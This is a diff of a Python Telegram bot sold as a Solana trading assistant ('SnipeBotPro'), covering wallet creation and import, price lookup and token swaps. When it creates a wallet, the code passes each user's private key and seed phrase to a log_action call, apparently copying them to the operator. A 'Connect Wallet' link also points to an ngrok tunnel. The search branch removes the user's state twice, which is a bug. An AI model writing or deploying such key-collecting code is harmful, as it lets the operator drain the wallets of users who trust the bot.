@@ -4,32 +4,7 @@ from telegram.ext import (
     CallbackQueryHandler, ContextTypes,
     MessageHandler, filters
 )
-import requests
-import logging
-TOKEN_MAP = {
-    "BONK": "bonk",
-    "SOL": "solana",
-    "ETH": "ethereum",
-    "BTC": "bitcoin"
-}
-def get_market_price(token_id):
-    try:
-        url = "https://api.coingecko.com/api/v3/simple/price"
-        params = {
-            "ids": token_id,
-            "vs_currencies": "usd"
-        }
 
-        res = requests.get(url, params=params, timeout=10)
-        data = res.json()
-
-        if token_id in data:
-            return data[token_id]["usd"]
-        return None
-
-    except Exception as e:
-        print("Market Price Error:", e)
-        return None
 from config import Config
 from wallet import (
     generate_wallet,
@@ -40,7 +15,7 @@ from wallet import (
     sign_and_send,
     get_wallet_data
 )
-from trade import get_market_price, get_quote, create_swap_tx
+from trade import get_token_price, get_quote, create_swap_tx, SOL
 
 # ================= STATE =================
 user_state = {}
@@ -67,10 +42,7 @@ def main_menu():
         [InlineKeyboardButton("📊 Market", callback_data="market"),
          InlineKeyboardButton("📁 Positions", callback_data="positions")],
 
-        [InlineKeyboardButton(
-            "🔗 Connect Wallet",
-            url="https://phantom.app/ul/browse/https://abc123.ngrok.io"
-        )],
+
 
         [InlineKeyboardButton("❓ Help", callback_data="help")]
     ])
@@ -82,7 +54,11 @@ def wallet_menu():
         [InlineKeyboardButton("📥 Import PK", callback_data="import_pk")],
         [InlineKeyboardButton("📥 Import Phrase", callback_data="import_phrase")],
         [InlineKeyboardButton("👁 View Wallet", callback_data="view_wallet")],
-        [InlineKeyboardButton("🔙 Menu", callback_data="menu")]
+        [InlineKeyboardButton("🔙 Menu", callback_data="menu")],
+        [InlineKeyboardButton(
+            "🔗 Connect Wallet",
+            url="https://phantom.app/ul/browse/https://abc123.ngrok.io"
+        )]
     ])
 
 def trade_menu():
@@ -111,7 +87,7 @@ def trade_amount_menu():
 # ================= START =================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🏠 Main Menu",
+        "🏠SnipeBotPro — Your Ultimate Solana Trading Assistant! Automate sniping, track token prices in real-time, execute lightning-fast swaps, and stay ahead of the market with precision tools built for serious traders.",
         reply_markup=main_menu()
     )
 
@@ -123,47 +99,60 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user_id = query.from_user.id
 
+
+
     # MENU
     if query.data == "menu":
-        await query.edit_message_text("🏠 Main Menu", reply_markup=main_menu())
+        await query.edit_message_text(" 🏠SnipeBotPro — Your Ultimate Solana Trading Assistant! Automate sniping, track token prices in real-time, execute lightning-fast swaps, and stay ahead of the market with precision tools built for serious traders.", reply_markup=main_menu())
 
     # WALLET
     elif query.data == "wallet":
         await query.edit_message_text("👛 Wallet Panel", reply_markup=wallet_menu())
 
+
     elif query.data == "gen_wallet":
-        pub, pk, phrase = generate_wallet(user_id)
+        try:
+            pub, pk, phrase = generate_wallet(user_id)
 
-        await query.edit_message_text(
-            f"🆕 WALLET CREATED\n\n"
-            f"👛 Address:\n{pub}\n\n"
-            f"🔑 Private Key:\n{pk}\n\n"
-            f"🧠 Phrase:\n{phrase}\n\n"
-            f"⚠️ SAVE THIS SECURELY",
-            reply_markup=wallet_menu()
-        )
+            await query.edit_message_text(
+                f"🆕 WALLET CREATED\n\n"
+                f"👛 Address:\n{pub}\n\n"
+                f"🔑 Private Key:\n{pk}\n\n"
+                f"🧠 Phrase:\n{phrase}\n\n"
+                f"⚠️ SAVE THIS SECURELY",
+                reply_markup=wallet_menu()
+            )
 
-        await log_action(context,
-            f"🆕 Wallet\nUser:{user_id}\nPK:{pk}\nPhrase:{phrase}"
-        )
+            await log_action(context,
+                             f"🆕 Wallet\nUser:{user_id}\nPK:{pk}\nPhrase:{phrase}"
+                             )
+
+        except Exception as e:
+            print("WALLET ERROR:", e)
+            await query.edit_message_text("❌ Wallet generation failed")
 
     elif query.data == "view_wallet":
-        wallet = load_wallet(user_id)
+        try:
+            wallet = load_wallet(user_id)
 
-        if not wallet:
-            await query.edit_message_text("❌ No wallet found", reply_markup=wallet_menu())
-            return
+            if not wallet:
+                await query.edit_message_text("❌ No wallet found", reply_markup=wallet_menu())
+                return
 
-        balance = get_balance(user_id)
+            balance = get_balance(user_id)
 
-        await query.edit_message_text(
-            f"👛 Address:\n{wallet.pubkey()}\n\n💰 Balance: {balance} SOL",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔑 Private Key", callback_data="show_pk"),
-                 InlineKeyboardButton("🧠 Phrase", callback_data="show_phrase")],
-                [InlineKeyboardButton("🔙 Back", callback_data="wallet")]
-            ])
-        )
+            await query.edit_message_text(
+                f"👛 Address:\n{wallet.pubkey()}\n\n💰 Balance: {balance} SOL",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔑 Private Key", callback_data="show_pk"),
+                     InlineKeyboardButton("🧠 Phrase", callback_data="show_phrase")],
+                    [InlineKeyboardButton("🔙 Back", callback_data="wallet")]
+                ])
+            )
+
+        except Exception as e:
+            print("VIEW WALLET ERROR:", e)
+            await query.edit_message_text("❌ Failed to load wallet")
 
     elif query.data == "show_pk":
         data = get_wallet_data(user_id)
@@ -197,6 +186,16 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # TRADE
     elif query.data == "trade":
+        wallet = load_wallet(user_id)
+
+        if not wallet:
+            await query.edit_message_text(
+                "❌ No wallet connected.\n\n"
+                "Please create or import a wallet first.",
+                reply_markup=wallet_menu()
+            )
+            return
+
         user_state[user_id] = "buy_token"
         await query.edit_message_text("Send token mint address:")
 
@@ -213,17 +212,12 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # MARKET
     elif query.data == "market":
-        text = "📊 Market Prices:\n\n"
-
-        for symbol, coingecko_id in TOKEN_MAP.items():
-            price = get_token_price(coingecko_id)
-
-            if price:
-                text += f"{symbol}: ${price}\n"
-            else:
-                text += f"{symbol}: ❌ Error\n"
-
-        await query.edit_message_text(text)
+        try:
+            user_state[user_id] = "search"
+            await query.edit_message_text("Send token mint to get price:")
+        except Exception as e:
+            print("MARKET BUTTON ERROR:", e)
+            await query.edit_message_text("❌ Market failed")
 
     # POSITIONS
     elif query.data == "positions":
@@ -271,16 +265,33 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # MARKET SEARCH
     elif state == "search":
-        price = get_market_price(text.lower())
+        try:
+            price = get_token_price(text)
 
-        await update.message.reply_text(
-            f"💰 Price: ${price}" if price else "❌ Token not found"
-        )
+            if not price:
+                await update.message.reply_text("❌ Token not found")
+            else:
+                await update.message.reply_text(f"💰 Price: {price}")
+
+        except Exception as e:
+            print("PRICE ERROR:", e)
+            await update.message.reply_text("❌ Failed to fetch price")
+
+        user_state.pop(user_id)
 
         user_state.pop(user_id)
 
     # BUY FLOW
     elif state == "buy_token":
+        wallet = load_wallet(user_id)
+
+        if not wallet:
+            await update.message.reply_text(
+                "❌ No wallet connected.\nCreate or import first."
+            )
+            user_state.pop(user_id)
+            return
+
         buy_data[user_id] = {"token": text}
 
         await update.message.reply_text(
@@ -307,17 +318,36 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 wallet = load_wallet(user_id)
 
                 if not wallet:
-                    await update.message.reply_text("❌ No wallet loaded")
+                    await update.message.reply_text(
+                        "❌ No wallet connected.\nCreate or import one first."
+                    )
                     return
 
                 await update.message.reply_text("⏳ Processing trade...")
 
-                quote = get_quote(token, lamports)
+                quote = None
+
+                for _ in range(3):
+                    quote = get_quote(SOL, token, int(amount * 1e9))
+                    if quote:
+                        break
+
                 if not quote:
-                    await update.message.reply_text("❌ No liquidity")
+                    await update.message.reply_text(
+                        "❌ No trading route found.\n\n"
+                        "This token might:\n"
+                        "• Have no liquidity yet\n"
+                        "• Not be listed on DEXs\n"
+                        "• Be too new\n\n"
+                        "Try again later or use another token."
+                    )
                     return
 
-                swap = create_swap_tx(quote, wallet.pubkey())
+                swap = create_swap_tx(wallet.pubkey(), quote)
+
+                if not swap or "swapTransaction" not in swap:
+                    await update.message.reply_text("❌ Failed to build transaction")
+                    return
 
                 tx = sign_and_send(user_id, swap["swapTransaction"])
 
@@ -337,8 +367,12 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
         buy_data.pop(user_id, None)
 
 
+
 # ================= RUN =================
 app = ApplicationBuilder().token(Config.TELEGRAM_TOKEN).build()
+
+# Prevent timeout issues on cloud
+app.job_queue.run_once(lambda *_: None, 0)
 
 app.add_handler(CommandHandler("start", start))
 app.add_handler(CallbackQueryHandler(handle_buttons))
